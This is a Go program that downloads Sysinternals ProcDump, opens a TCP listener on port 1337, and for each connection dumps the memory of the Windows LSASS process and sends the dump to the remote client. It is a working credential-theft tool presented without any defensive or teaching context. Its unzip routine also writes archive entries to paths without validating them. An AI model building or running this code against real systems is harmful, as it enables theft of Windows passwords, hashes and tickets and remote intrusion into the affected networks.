package main

import (
	"archive/zip"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

func Unzip(src, dest string) error {
	r, err := zip.OpenReader(src)
	if err != nil {
		return err
	}
	defer func() {
		if err := r.Close(); err != nil {
			panic(err)
		}
	}()

	os.MkdirAll(dest, 0755)

	// Closure to address file descriptors issue with all the deferred .Close() methods
	extractAndWriteFile := func(f *zip.File) error {
		rc, err := f.Open()
		if err != nil {
			return err
		}
		defer func() {
			if err := rc.Close(); err != nil {
				panic(err)
			}
		}()

		path := filepath.Join(dest, f.Name)

		if f.FileInfo().IsDir() {
			os.MkdirAll(path, f.Mode())
		} else {
			os.MkdirAll(filepath.Dir(path), f.Mode())
			f, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
			if err != nil {
				return err
			}
			defer func() {
				if err := f.Close(); err != nil {
					panic(err)
				}
			}()

			_, err = io.Copy(f, rc)
			if err != nil {
				return err
			}
		}
		return nil
	}

	for _, f := range r.File {
		err := extractAndWriteFile(f)
		if err != nil {
			return err
		}
	}

	return nil
}

func setup() error {
	f, err := os.Create("C:\\Users\\Administrator\\AppData\\Local\\Temp\\dump.zip")
	if err != nil {
		return err
	}
	defer f.Close()
	resp, err := http.Get("https://download.sysinternals.com/files/Procdump.zip")
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(f, resp.Body)
	return Unzip("C:\\Users\\Administrator\\AppData\\Local\\Temp\\dump.zip", "C:\\Users\\Administrator\\AppData\\Local\\Temp\\dump")
}

func dump(file string) {
	exec := exec.Command("C:\\Users\\Administrator\\AppData\\Local\\Temp\\dump\\procdump.exe", "-accepteula", "-ma", "lsass.exe", file)
	exec.Run()
}

func main() {
	if err := setup(); err != nil {
		log.Fatal(err)
	}
	l, err := net.Listen("tcp", ":1337")
	if err != nil {
		log.Fatal(err)
	}
	defer l.Close()
	for {
		con, err := l.Accept()
		if err != nil {
			log.Println(err)
			continue
		}
		tmp, err := ioutil.TempFile("", "dump")
		if err != nil {
			log.Println(err)
			continue
		}
		dump(tmp.Name())
		f, err := os.Open(tmp.Name() + ".dmp")
		if err != nil {
			log.Println(err)
			con.Close()
			continue
		}
		go func(c net.Conn, f *os.File) {
			io.Copy(c, f)
			c.Close()
			f.Close()
		}(con, f)
	}
}
